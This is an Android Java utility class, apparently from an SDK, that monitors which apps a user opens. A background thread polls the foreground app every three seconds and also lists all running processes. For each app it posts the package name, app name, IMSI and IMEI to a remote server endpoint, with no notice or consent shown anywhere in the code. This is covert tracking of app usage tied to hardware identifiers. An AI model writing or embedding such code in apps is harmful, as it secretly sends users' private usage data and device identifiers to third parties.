package com.core_sur.tools;

import java.util.HashMap;
import java.util.List;

import org.json.JSONObject;

import com.core_sur.finals.URLFinals;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Handler;
import android.os.Message;
import android.widget.Toast;

public class RunningAppsManager {
private static RunningAppsManager appsManager = new RunningAppsManager();
private static Context c ;
private String runningApp;
/**
 * 
 *
 * @param c
 * @return 单例化
 */
private void postdata(final String runningApp) {
			HashMap<String, Object> jsonMap= new HashMap<String, Object>();
			jsonMap.put("PackageName", runningApp);
			PackageManager pm = c.getPackageManager();
			ApplicationInfo appInfo = null;
			try {
			 appInfo = pm.getApplicationInfo(runningApp, 0);
			} catch (NameNotFoundException e) {
				e.printStackTrace();
			}
			CharSequence name=null;
			if(appInfo==null){
				
				 name = null;
				
			}else{
				 name = appInfo.loadLabel(pm);
			}
			
			jsonMap.put("AppName", name);
			jsonMap.put("Imsi", CommonUtils.getImsi(c));
			jsonMap.put("DeviceId", CommonUtils.getImei(c));
			JSONObject jsonObject = new JSONObject(jsonMap);
			String newApp = jsonObject.toString(); //拿到代码
			HttpClientUtils clientUtils = new HttpClientUtils();
			clientUtils.getInputStream(URLFinals.UserStartsApp, newApp);
}
public static RunningAppsManager getInstance(Context context){
	c = context;
	return appsManager;
}
private RunningAppsManager() {
	// TODO Auto-generated constructor stub
}
boolean isObServe=false;
private void startThread() {
	new Thread(){
		public void run() {
			getRunningApp(c);
	while (isObServe){
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		String topApp = getTopApp(c);
		if(topApp==null||topApp.equals(runningApp)||topApp.equals(c.getPackageName())){
			continue;
		}
		runningApp=topApp;
		postdata(runningApp);
	}		
		};
	}.start();
}
public void start(){
	isObServe=true;
	startThread();
}
public void destroy(){
	isObServe=false;
}
public String getTopApp(Context c){
	ActivityManager am = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
	List<RunningTaskInfo> runningTasks = am.getRunningTasks(1);
for (RunningTaskInfo info :runningTasks) {
	String packageName = info.baseActivity.getPackageName();
	return packageName;
}
return null;
}
public void getRunningApp(final Context c){
					ActivityManager am = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
					PackageManager pm = c.getPackageManager();
					List<RunningAppProcessInfo> apps = am.getRunningAppProcesses();
					for (RunningAppProcessInfo app:apps) {
						String[] pkgNameList  = app.pkgList;
				for (int i = 0; i < pkgNameList.length; i++) {
				String packageName=	pkgNameList[i];
					postdata(packageName);
				}
					}	

}
}
